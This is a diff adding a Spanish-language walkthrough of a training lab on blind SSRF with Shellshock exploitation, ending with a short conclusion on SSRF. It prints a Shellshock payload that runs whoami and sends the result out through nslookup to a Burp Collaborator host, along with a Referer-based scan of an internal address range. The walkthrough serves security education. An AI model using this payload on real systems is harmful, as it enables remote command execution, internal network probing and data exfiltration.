@@ -250,3 +250,54 @@ Entonces, podemos ver que al enviar el paquete, el servidor realiza una solicitu
 
 ## 7. Laboratorio: SSRF ciego con explotación Shellshock
 
+```
+Este sitio utiliza un software de análisis que obtiene la URL especificada en el encabezado Referer cuando se carga una página de producto.
+
+Para resolver el laboratorio, use esta funcionalidad para realizar un ataque SSRF ciego contra un servidor interno en el rango 192.168.0.X . En el ataque ciego, use una carga útil de Shellshock contra el servidor interno para filtrar el nombre del usuario del sistema operativo.
+```
+
+Realizamos lo mismo que en el laboratorio anterior, y observamos en el burpcollaborator, que el **user-agent** del paquete que enviamos y el que llega al **burp collaborator**.
+
+![](img39.png)
+
+Entonces sabemos que el payload de shellshock que se especifica en el **User-Agent** es el siguiente:
+
+```
+() { :; }; /bin/eject
+```
+
+Entonces, lo que haremos será ejecutar el programa whoami y enviarlo por una consulta nslookup con el siguiente payload.
+
+```
+() { :; }; /usr/bin/nslookup `/usr/bin/whoami`.ebt3zmpikulve14b34lnozf01r7iv7.burpcollaborator.net
+```
+
+Ahora, no sabemos cual es la ip objetivo, pero tenemos un rango el cual es: 192.168.0.X, entonces enviamos el paquete al intruder y realizamos la siguiente configuracion.
+
+![](img40.png)
+
+Y luego en **Payloads** especificamos lo siguiente:
+
+![](img41.png)
+
+Y luego hacemos clic en **Start attack**.
+
+![](img42.png)
+
+Pero no nos topamos con ningun resultado entonces intentaremos con el puerto 8080, mejor dicho:
+
+```
+Referer: http://192.168.0.§1§:8080/
+```
+
+Y lo enviamos de nuevo para ver si obtenemos algun resultado.
+
+![](img43.png)
+
+Y podemos ver como nos salió la consulta dns, donde podemos ver el usuario del sistema operativo. Así que vamos al home del laboratorio y enviamos el nombre del usurio para completar el laboratorio.
+
+![](img44.png)
+
+## CONCLUSION
+
+Los laboratorios de SSRF han sido muy utiles para poder comprender la magnitud de esta vulnerabilidad que puede usarse para una exploracion interna de la red en donde pertenezca el usuario, como tambien para realizar solicitudes a servidores externos usando el servidor vulnerable como intermediario.
